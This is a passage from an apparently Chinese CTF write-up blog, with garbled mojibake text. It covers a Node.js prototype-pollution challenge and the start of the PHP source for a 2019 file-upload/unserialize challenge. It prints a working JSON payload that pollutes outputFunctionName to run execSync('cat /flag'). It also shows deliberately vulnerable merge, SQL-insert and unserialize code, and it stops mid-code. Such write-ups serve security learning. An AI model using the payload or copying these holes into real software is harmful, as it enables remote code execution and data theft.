src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/20220526230030.png"></p><p>ç”¨admÄ±nç»è¿‡<code>toUpperCase</code>å¤„ç†åå˜æˆADMINï¼Œè¿›å»ä¹‹åæ²¡å•¥å¤´ç»ªï¼Œæ‰«ä¸ªç›®å½•å§ï¼Œ<a href="http://www.zipæ‹¿åˆ°æºç ,å¯ä»¥çœ‹åˆ°resä¸­çš„outputfunctionnameå±æ€§ä¸ºç©º,å¯ä»¥è¿›è¡Œæ±¡æŸ“,å¹¶ä¸”åœ¨infoä¸­ç›´æ¥è·å¾—çš„å°±æ˜¯outputfunctionnameä¸­çš„å†…å®¹/">www.zipæ‹¿åˆ°æºç ï¼Œå¯ä»¥çœ‹åˆ°resä¸­çš„outputFunctionNameå±æ€§ä¸ºç©ºï¼Œå¯ä»¥è¿›è¡Œæ±¡æŸ“ï¼Œå¹¶ä¸”åœ¨infoä¸­ç›´æ¥è·å¾—çš„å°±æ˜¯outputFunctionNameä¸­çš„å†…å®¹</a></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  res<span class="token punctuation">.</span>outputFunctionName<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string-property property">'user'</span><span class="token operator">:</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>user<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å†åŠ ä¸Šä¸Šé¢çš„cloneæ–¹æ³•</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">merge</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> attr <span class="token keyword">in</span> b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isObject</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isObject</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">merge</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">,</span> b<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      a<span class="token punctuation">[</span>attr<span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> a<span class="token punctuation">&#125;</span><span class="token keyword">const</span> <span class="token function-variable function">clone</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">a</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤æ—¶æˆ‘ä»¬å‘/actionä¸­ä¼ å…¥jsonç¼–ç åçš„payload</p><pre class="line-numbers language-none"><code class="language-none">POST:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a&#x3D;1;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat &#x2F;flag&#39;)&#x2F;&#x2F;&quot;&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>å†è®¿é—®infoå³å¯è·å–flag</p><h2 id="å®‰æ´µæ¯-2019-ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ "><a href="#å®‰æ´µæ¯-2019-ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="[å®‰æ´µæ¯ 2019]ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ "></a>[å®‰æ´µæ¯ 2019]ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ </h2><p>ä¼ æ–‡ä»¶ï¼Œè¯•åç¼€ï¼Œæ‰«ç›®å½•éƒ½ä¸è¡Œï¼Œçœ‹æºç </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">helper</span> <span class="token punctuation">&#123;</span><span class="token keyword">protected</span> <span class="token variable">$folder</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"pic/"</span><span class="token punctuation">;</span><span class="token keyword">protected</span> <span class="token variable">$ifview</span> <span class="token operator">=</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span> <span class="token keyword">protected</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"config.txt"</span><span class="token punctuation">;</span><span class="token comment">// The function is not yet perfect, it is not open yet.</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">upload</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token operator">=</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$fileinfo</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getfile</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"title"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"filename"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"ext"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ext'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"path"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$img_ext</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$input</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$my_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"width"</span><span class="token operator">=></span><span class="token variable">$img_ext</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"height"</span><span class="token operator">=></span><span class="token variable">$img_ext</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"attr"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$my_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$id</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Something wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>Your images is uploaded successfully. And your image's id is <span class="token interpolation"><span class="token variable">$id</span></span>.&lt;/p>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getfile</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$rs</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$input</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token variable">$rs</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$basename</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cate_exts</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"jpg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"gif"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"png"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"jpeg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token variable">$cate_exts</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;p>Please upload the correct image file!!!&lt;/p>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'title'</span><span class="token operator">=></span><span class="token variable">$title</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'filename'</span><span class="token operator">=></span><span class="token variable">$basename</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'ext'</span><span class="token operator">=></span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'path'</span><span class="token operator">=></span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">folder</span><span class="token operator">.</span><span class="token variable">$basename</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">save</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$data</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Something wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">insert_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">insert_array</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r00t"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r00t"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pic_base"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_connect_errno</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Connect MySQL Fail:"</span><span class="token operator">.</span><span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$sql_fields</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql_val</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=></span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$key_temp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'*'</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$value_temp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'*'</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql_fields</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"`"</span><span class="token operator">.</span><span class="token variable">$key_temp</span><span class="token operator">.</span><span class="token string double-quoted-string">"`"</span><span class="token punctuation">;</span><span class="token variable">$sql_val</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"'"</span><span class="token operator">.</span><span class="token variable">$value_temp</span><span class="token operator">.</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO images ("</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">","</span><span class="token punctuation">,</span><span class="token variable">$sql_fields</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">") VALUES("</span><span class="token operator">.</span><span class="token punctuation">(</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">","</span><span class="token punctuation">,</span><span class="token variable">$sql_val</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">")"</span><span class="token punctuation">;</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">mysqli_insert_id</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token variable">$id</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">view_files</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">ifview</span> <span class="token operator">==</span> <span class="token constant boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span><span class="token comment">//The function is not yet perfect, it is not open yet.</span><span class="token punctuation">&#125;</span><span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment"># Read some config html</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">view_files</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">config</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//upload.php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./helper.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">upload</span> <span class="token keyword">extends</span> <span class="token class-name">helper</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">upload_base</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Upload file failed."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span><span class="token operator">-></span><span class="token function">upload_base</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">helper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//show.php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./helper.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$show</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"delete_all"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"delete_all"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$show</span><span class="token operator">-></span><span class="token function">Delete_All_Images</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$show</span><span class="token operator">-></span><span class="token function">Get_All_Images</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">show</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$con</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r00t"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r00t"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pic_base"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_connect_errno</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Connect MySQL Fail:"</span><span class="token operator">.</span><span class="token function">mysqli_connect_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">Get_All_Images</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM images"</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"attr"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$attr_temp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'*'</span><span class="token operator">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"attr"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$attr</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$attr_temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p>id="</span><span class="token operator">.</span><span class="token 